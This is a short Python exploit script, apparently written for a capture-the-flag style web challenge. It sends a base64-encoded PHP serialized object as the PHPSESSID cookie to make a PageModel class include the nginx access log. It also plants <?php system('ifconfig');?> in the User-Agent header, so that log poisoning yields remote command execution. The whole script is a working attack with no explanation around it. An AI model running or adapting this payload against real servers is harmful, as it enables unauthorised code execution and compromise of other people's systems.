import base64
import requests

malicious_cookie = b'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'
print('Malicious Cookie:', malicious_cookie)

malicious_cookie_encoded = base64.b64encode(malicious_cookie)
print('Malicious cookie encoded:', malicious_cookie_encoded)

url = 'http://xxx:xxx'

cookies = {'PHPSESSID': malicious_cookie_encoded.decode()}

headers = {'User-Agent': "<?php system('ifconfig');?>"}

r = requests.get(url, cookies=cookies, headers=headers)
print(r.text)
